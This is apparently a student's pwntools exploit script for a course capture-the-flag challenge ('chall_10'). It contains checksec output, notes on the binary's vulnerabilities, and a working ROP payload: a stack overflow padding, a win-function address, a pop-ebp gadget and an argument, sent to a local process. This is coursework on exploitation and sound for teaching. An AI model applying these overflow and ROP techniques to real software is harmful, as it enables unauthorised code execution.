'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Project 2 --- chall_10
File Description:  ROP Chain, simple with one arg

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   71) Symbols       No    0               1               chall_10

File info:
chall_10: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=32fabeea7a1c3e6481f2efcf2c37fa1d6c3255ab, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions

Vulns:
    Not shell code since NX is on, but no canary or PIE?
    Also printf so maybe a printf vuln ---> tried, does not work so maybe stack smashing?
    Well looks like a ROP, since vuln and win func, probably needs an arg?
        Arg for Win ROP ---> 0x1a55fac3
'''

# Import Libaries
from pwn import *

# Padding to smash
offset = int("0x308",16)
pad = b'a' * offset # 308h to overwrite then + 4 for ebp to get to eip
padOverBP = b'z'*4
print("LEN OF PAD: ", len(pad))

# Address of win + Gadgets + func arg
winAddr = p32(0x080491d6)       # Only ble to find due to no PIE --> rabin2 -s
popGad = p32(0x08049303)        # : pop ebp ; ret
winArg = p32(0x1a55fac3)

# Start process and send line
p=process("./chall_10")
payload = pad + padOverBP + winAddr + popGad + winArg
p.send(payload)
p.interactive()